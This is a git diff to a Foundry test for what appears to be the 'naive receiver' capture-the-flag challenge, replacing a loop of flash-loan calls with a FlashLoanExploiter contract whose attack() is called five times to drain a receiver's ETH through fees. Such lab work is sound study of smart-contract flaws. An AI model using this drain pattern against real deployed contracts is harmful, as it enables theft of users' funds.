@@ -6,6 +6,7 @@ import "forge-std/Test.sol";
 import "forge-std/console.sol";
 
 import {FlashLoanReceiver} from "../../../src/Contracts/naive-receiver/FlashLoanReceiver.sol";
+import {FlashLoanExploiter} from "../../../src/Contracts/naive-receiver/FlashLoanExploiter.sol";
 import {NaiveReceiverLenderPool} from "../../../src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol";
 
 contract NaiveReceiver is Test {
@@ -15,6 +16,7 @@ contract NaiveReceiver is Test {
     Utilities internal utils;
     NaiveReceiverLenderPool internal naiveReceiverLenderPool;
     FlashLoanReceiver internal flashLoanReceiver;
+    FlashLoanExploiter internal flashLoanExploiter;
     address payable internal user;
     address payable internal attacker;
 
@@ -49,13 +51,18 @@ contract NaiveReceiver is Test {
     }
 
     function testExploit() public {
-        vm.deal(address(flashLoanReceiver), ETHER_IN_RECEIVER);
         /** EXPLOIT START **/
         vm.startPrank(attacker);
-        while (address(flashLoanReceiver).balance > 0) {
-            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1e18);
-        }
-
+        // need to find a way to bypass nonreantrant to call 10 times
+        flashLoanExploiter = new FlashLoanExploiter(
+            payable(naiveReceiverLenderPool),
+            address(flashLoanReceiver)
+        );
+        flashLoanExploiter.attack();
+        flashLoanExploiter.attack();
+        flashLoanExploiter.attack();
+        flashLoanExploiter.attack();
+        flashLoanExploiter.attack();
         vm.stopPrank();
         /** EXPLOIT END **/
         validation();
